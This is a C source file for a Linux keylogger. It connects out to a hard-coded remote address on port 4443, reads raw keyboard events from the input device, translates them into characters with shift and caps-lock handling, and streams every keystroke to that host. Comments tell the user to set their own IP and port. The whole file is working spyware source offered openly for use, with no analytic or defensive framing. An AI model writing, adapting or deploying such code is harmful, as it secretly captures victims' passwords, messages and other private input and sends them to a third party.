#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <linux/input.h>
#include "resolve_key.h"
#include "keyboard_finder.h"

int main() {
    int port = 4443;        // change this to your desired port number
    struct sockaddr_in revsockaddr;

    
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.56.1");       // change this to your desired IP address

    if (connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr)) < 0) {
        perror("connect");
        return 1;
    }

    /* Wrap socket in FILE* so we can use fputc/fputs */
    FILE *sock = fdopen(sockt, "w");
    if (!sock) {
        perror("fdopen");
        close(sockt);
        return 1;
    }

    char *kbd_path = find_keyboard_path();
    if (kbd_path) {
        printf("Keyboard found: %s\n", kbd_path);
       
    } else {
        fprintf(stderr, "No keyboard found (check root or 'input' group permissions).\n");
        return 1;
    }
    printf("Keylogger started\n");
    int fd = open(kbd_path, O_RDONLY , 0);
    if (fd == -1) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }


    struct input_event ie;
    bool left_shift = false, right_shift = false, caps = false;

    while (1) {

        read(fd, &ie, sizeof(ie));
        if (ie.type != EV_KEY)
            continue;

        // Track modifier state on both press (1), autorepeat (2) and release (0)
        if (ie.code == KEY_LEFTSHIFT)
            left_shift = (ie.value != 0);
        else if (ie.code == KEY_RIGHTSHIFT)
            right_shift = (ie.value != 0);
        else if (ie.code == KEY_CAPSLOCK && ie.value == 1)
            caps = !caps;


        if (ie.value != 1 && ie.value != 2)
            continue;
        
            
        if (ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT ||
            ie.code == KEY_CAPSLOCK)
            continue;    


        bool shift = left_shift || right_shift;
        char c = resolve_key(ie.code, shift, caps);
        if (c) {
            fputc(c, sock);
        } else {
            const char *name = special_key_name(ie.code);
            if (name)
                fputs(name, sock);
        }
        fflush(sock);            

    }
    
    close(fd);
    fclose(sock);
    return 0;

}
